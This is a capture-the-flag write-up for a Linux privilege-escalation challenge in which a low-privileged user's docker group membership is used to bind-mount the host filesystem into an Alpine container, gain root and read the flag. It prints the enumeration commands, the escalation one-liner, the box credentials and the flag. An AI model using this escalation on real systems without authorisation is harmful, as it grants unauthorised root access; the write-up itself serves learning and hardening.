# TL Priv Escl #1

![Event](https://img.shields.io/badge/SecLeaf_CTF-2026-101518?style=flat-square)
![Category](https://img.shields.io/badge/Category-Miscellaneous-B4441F?style=flat-square)
![Points](https://img.shields.io/badge/Points-150-2F5D3A?style=flat-square)

> **Solved by** [Rutwik](https://github.com/Rutwik-712) · **Team** Bug Busters · **Solved** 1 November 2026, 9:10 am

## Challenge description

A Linux box reachable with the low-privileged account below; escalate to root to
read the flag.

> "Access the machine using these credentials! Username: osint  Password: TLosint"

**Flag format:** `SecLeaf{...}`

**Attachments:** none; remote SSH/console target (offline after the event).

## Flag

```text
SecLeaf{local_escl4t3_r00t}
```

## Writeup

Read the full solve: **[writeup.md](writeup.md)**

**In one line:** the `osint` user is in the `docker` group, and docker-group
membership is root-equivalent – mount the host's `/` into a container and read
the root-owned flag.

- `id` shows `osint` in group `998(docker)`; `sudo -l` and SUID hunting were dead ends.
- The Docker daemon runs as root, so any docker-group member can tell it to bind-mount the host filesystem.
- `docker run --rm -it -v /:/host alpine sh` gives a root shell with the real host rooted at `/host`.
- `cat /host/root/flag.txt` returns the flag.

## Files

| Path | What it is |
| --- | --- |
| [`writeup.md`](writeup.md) | Full solve |

## Commands

```bash
# 1. Log in with the provided credentials (osint / TLosint), then enumerate
id
# uid=1000(osint) gid=1000(osint) groups=1000(osint),998(docker)
whoami
sudo -l                                   # nothing useful
find / -perm -4000 -type f 2>/dev/null    # no useful SUID path

# 2. Confirm we can talk to the root-owned Docker daemon
docker ps
docker images

# 3. Bind-mount the host root filesystem into a throwaway container
docker run --rm -it -v /:/host alpine sh

# 4. Inside the container we are root; the host is at /host
id                                        # uid=0(root) gid=0(root) groups=0(root)
cat /host/root/flag.txt
# SecLeaf{local_escl4t3_r00t}
```

## Notes

- **No offline solver:** this is a live-machine privilege escalation; the box is offline after the event, so the steps above are the reproduction.
- `docker` group membership is **root-equivalent by design** – this is how the Docker daemon is meant to work, not a Docker vulnerability. The misconfiguration is putting a low-privileged user in that group.
- `--rm` makes the container delete itself on exit, leaving no artifact on the host.
- The only credentials shown are the challenge-provided CTF box login (`osint` / `TLosint`).

---

[← Back to Miscellaneous](../README.md) · [All writeups](../../README.md)
